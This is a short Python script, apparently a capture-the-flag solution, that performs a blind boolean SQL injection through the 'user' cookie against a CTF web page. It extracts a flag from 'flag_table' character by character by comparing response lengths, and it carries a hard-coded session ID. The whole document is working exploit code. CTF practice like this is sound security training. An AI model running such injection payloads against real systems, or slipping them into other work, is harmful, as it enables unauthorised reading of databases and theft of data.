import requests

url="http://ctf.segfaulthub.com:7777/sqli_6/mypage.php"

answer = ''

for i in range(1,40):
  for j in range(33,127):
    cookies = {
      'user': f"""hello' and ascii(substr((select flag from flag_table limit 1,1),{i},1)) > {j} and '1' = '1""",
      'PHPSESSID':'vnu7a98tt9nt52648lnkdqp8dc'
    }

    response = requests.get(url, cookies=cookies)

    x = len(response.text)
    if x < 1415:
      answer += chr(j)
      break

  print(answer)